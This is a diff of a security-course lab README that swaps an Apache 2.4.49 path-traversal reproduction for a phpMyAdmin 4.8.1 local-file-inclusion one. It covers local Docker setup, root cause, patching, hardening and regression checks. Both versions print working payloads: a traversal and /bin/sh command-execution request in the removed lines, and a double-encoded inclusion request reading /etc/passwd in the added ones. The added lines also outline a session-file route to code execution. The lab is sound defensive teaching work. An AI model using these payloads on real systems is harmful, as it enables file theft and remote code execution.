@@ -1,110 +1,110 @@
 # Work 1 — CVE reproduction, root cause and fix
 
-Target: **CVE-2021-41773** — path traversal in Apache HTTP Server 2.4.49
-(affects 2.4.49; 2.4.50 partially, fully fixed in 2.4.51; double-encoded variant is CVE-2021-42013).
+Target: **CVE-2018-12613** — local file inclusion in phpMyAdmin 4.8.1
+(PMASA-2018-4; fixed in 4.8.2; affects 4.8.0 and 4.8.1).
 
 ## 1. Vulnerable environment
 
-`docker-compose.yml` starts `httpd:2.4.49` with CGI enabled and `<Directory />` set to
-`Require all granted` — the configuration used by the public Vulhub PoC
-(`vulhub/httpd/CVE-2021-41773`).
+`docker-compose.yml` starts the public Vulhub environment: `vulhub/phpmyadmin:4.8.1`
+plus `mysql:5.5`, with `config.inc.php` in `config` auth mode so the page needs no manual login.
 
 ```bash
-docker compose up -d          # starts httpd 2.4.49 on http://127.0.0.1:8080
+docker compose up -d          # phpMyAdmin 4.8.1 on http://127.0.0.1:8080
 docker compose ps
-curl -s http://127.0.0.1:8080/ | head -3
+curl -s http://127.0.0.1:8080/ | grep -o '<title>[^<]*'
 ```
 
 ## 2. Reproduction
 
 ```bash
-# traversal outside the document root (file disclosure)
-curl --path-as-is -s "http://127.0.0.1:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"
-
-# same primitive reaching a shell when mod_cgi is enabled (RCE)
-curl --path-as-is -s "http://127.0.0.1:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" \
-     --data "echo Content-Type: text/plain; echo; id"
+curl --path-as-is -s \
+  "http://127.0.0.1:8080/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd"
 ```
 
-Expected on the vulnerable build: the contents of `/etc/passwd` and the output of `id`
-(`uid=1(daemon) gid=1(daemon)`), i.e. arbitrary file read and command execution as the
-httpd user. Captured evidence goes to `evidence/`.
+Expected on the vulnerable build: the response embeds the contents of `/etc/passwd`
+(`root:x:0:0:root:/root:/bin/bash` …) inside the page — arbitrary file read.
+Captured evidence is in `evidence/`.
 
 ## 3. Root cause
 
-Apache 2.4.49 rewrote path normalisation (`ap_normalize_path`). The new code only expanded
-`%2e` segments for paths that *start* inside the document root and did not reject `..`
-sequences that escape it, so `/.%2e/.%2e/...` normalised to `../../..` **after** the
-authorisation check but **before** the file lookup. Two configuration choices turn this
-into impact:
+`index.php` includes a file chosen by the `target` request parameter:
 
-1. `<Directory />` is `Require all granted`, so the authorisation phase allows the escaped
-   path;
-2. `mod_cgi` is loaded, so any traversed executable is run with the request body as input.
+```php
+if (! empty($_REQUEST['target']) && is_string($_REQUEST['target'])
+    && ! preg_match('/^index/', $_REQUEST['target'])
+    && ! in_array($_REQUEST['target'], $target_blacklist)
+    && Core::checkPageValidity($_REQUEST['target'])) {
+    include $_REQUEST['target'];
+    exit;
+}
+```
 
-Without (1) the request is a 403; without (2) it is file disclosure only. The bug class is
-*improper input handling* (incomplete canonicalisation of user-controlled paths), not a
-memory-safety defect.
+`Core::checkPageValidity()` validates the parameter against a whitelist of pages
+(`db_sql.php`, `sql.php`, …) and **decodes the value a second time** while doing so.
+That double decoding is the flaw:
 
-## 4. Fix
+1. the request carries `db_sql.php%253f/../../../../etc/passwd`;
+2. the first URL decode turns `%253f` into `%3f`, so the whitelist check only sees
+   `db_sql.php` and passes;
+3. `include` then resolves the full string, where `%3f` is a `?` and the `../` segments
+   climb out of the phpMyAdmin directory.
 
-Two independent layers (both applied in `fixed/`):
+In short: **the value that is validated is not the value that is used** — a canonicalisation
+bug of the same family as CVE-2021-41773 (decode/validate order), just in PHP instead of C.
+
+## 4. Impact and escalation
+
+Reading arbitrary files already leaks configuration (`config.inc.php` holds database
+credentials) and system data. The public write-ups escalate it to code execution by writing
+PHP into the session file (`SELECT '<?=phpinfo()?>'` stores the query in the session) and then
+including `/var/lib/php/sessions/sess_<PHPSESSID>`. In this container `access.log` is a symlink
+to `/dev/stdout`, so the classic log-poisoning variant is not available; the session variant was
+therefore documented but not executed here — the file read is enough to prove the vulnerability.
+
+## 5. Fix
 
 | Layer | Change | Why it works |
 |---|---|---|
-| Patch | `httpd:2.4.49` → `httpd:2.4.51` | 2.4.51 rejects any normalised path that escapes the document root, and also blocks the double-encoded `%252e` bypass of 2.4.50 |
-| Hardening | `<Directory />` → `Require all denied`, CGI only inside `/usr/local/apache2/cgi-bin` | removes the second precondition: even with a future canonicalisation bug, traversal cannot be authorised |
+| Patch | upgrade to **4.8.2** (the branch fix, PMASA-2018-4); this lab uses **5.2.2**, which contains the same fix and is still maintained | `target` is validated after a single decode and restricted to real pages, so `db_sql.php%253f/../…` can no longer pass the whitelist |
+| Hardening | `open_basedir` limited to the web root, `allow_url_include=Off`, least-privilege DB account | even with a future include bug, PHP cannot read outside the web root or fetch remote files |
 
 ```bash
-cd fixed
-docker compose up -d --build
+docker build -f fixed/Dockerfile -t hdu-is/cve-2018-12613:fixed .
+docker run -d --name cve-fixed --network cve-net -p 8081:80 hdu-is/cve-2018-12613:fixed
 ```
 
-## 5. Verification and regression
+## 6. Verification and regression
 
 ```bash
-# attack must fail now (403 or 400, never /etc/passwd content)
-cd fixed && bash ../poc.sh http://127.0.0.1:8081
-
-# normal functionality must still work
-curl -s http://127.0.0.1:8081/ | head -3
-curl -s "http://127.0.0.1:8081/cgi-bin/hello.sh"     # legitimate CGI still executes
+bash poc.sh http://127.0.0.1:8080   # exit 1: vulnerable, /etc/passwd disclosed
+bash poc.sh http://127.0.0.1:8081   # exit 0: blocked, no file content
+curl -s -o /dev/null -w '%{http_code}\n' http://127.0.0.1:8081/   # 200, login page still served
 ```
 
-`poc.sh` exits non-zero when any attack payload returns file content, so it doubles as a
-regression check in CI or by hand.
+## 7. Results of this run (2026-10-20)
 
-## 6. Evidence checklist
-
-- [x] `docker compose up -d` output and container list → `evidence/`
-- [x] traversal request + `/etc/passwd` response → `evidence/01-vulnerable-traversal.txt`
-- [x] `id` output through `/bin/sh` → `evidence/02-vulnerable-rce.txt`
-- [x] `poc.sh` against the fixed container (all blocked) → `03-*`, `04-*`
-- [x] home page / CGI still served after the fix (regression) → `05-regression.txt`
-
-## 7. Results of this run (2026-10-19)
-
-| Step | Vulnerable `httpd:2.4.49` | Fixed `httpd:2.4.51` + hardening |
+| Step | Vulnerable phpMyAdmin 4.8.1 | Fixed phpMyAdmin 5.2.2 |
 |---|---|---|
-| `GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd` | **HTTP 200**, `root:x:0:0:root:/root:/bin/bash` | HTTP 400, no content |
-| `POST …/bin/sh` with `id` | **HTTP 200**, `uid=1(daemon) gid=1(daemon)` | HTTP 400, no output |
-| `GET /cgi-bin/hello.sh` | 200 hello from cgi | 200 hello from cgi (unchanged) |
+| `GET /index.php?target=db_sql.php%253f/…/etc/passwd` | **HTTP 200**, page embeds `root:x:0:0:root:/root:/bin/bash` and the rest of `/etc/passwd` | HTTP 200, phpMyAdmin page only — no file content |
+| `GET /` (regression) | 200, phpMyAdmin UI | 200, phpMyAdmin login page |
 
 Reproduce locally:
 
 ```bash
-cd work1-cve
-docker build -t hdu-is/cve-2021-41773:2.4.49 .
-docker run -d --name cve-vuln -p 8080:80 hdu-is/cve-2021-41773:2.4.49
-
-cd fixed
-docker build -t hdu-is/cve-2021-41773:fixed .
-docker run -d --name cve-fixed -p 8081:80 hdu-is/cve-2021-41773:fixed
-
-bash ../poc.sh http://127.0.0.1:8080   # exits 1: vulnerable
-bash ../poc.sh http://127.0.0.1:8081   # exits 0: fixed
+docker network create cve-net
+docker run -d --name mysql --network cve-net \
+  -e MYSQL_RANDOM_ROOT_PASSWORD=yes -e MYSQL_DATABASE=test \
+  -e MYSQL_USER=test -e MYSQL_PASSWORD=test mysql:5.5
+docker build -t hdu-is/cve-2018-12613:4.8.1 .
+docker run -d --name cve-vuln --network cve-net -p 8080:80 hdu-is/cve-2018-12613:4.8.1
 ```
 
-Note: containers were run on a VirtualBox/boot2docker VM, so the host addresses above were
+Note: the containers were run on a VirtualBox/boot2docker VM, so the host addresses above were
 `192.168.99.100:8080` / `:8081`; `poc.sh` takes the base URL as its first argument.
 
+## 8. Evidence checklist
+
+- [x] vulnerable request + `/etc/passwd` in the response → `evidence/01-vulnerable-lfi.txt`
+- [x] excerpt of the disclosed file → `evidence/02-vulnerable-passwd.txt`
+- [x] same request against the fixed build → `evidence/03-fixed-lfi.txt`
+- [x] regression (UI still served) → `evidence/04-regression.txt`
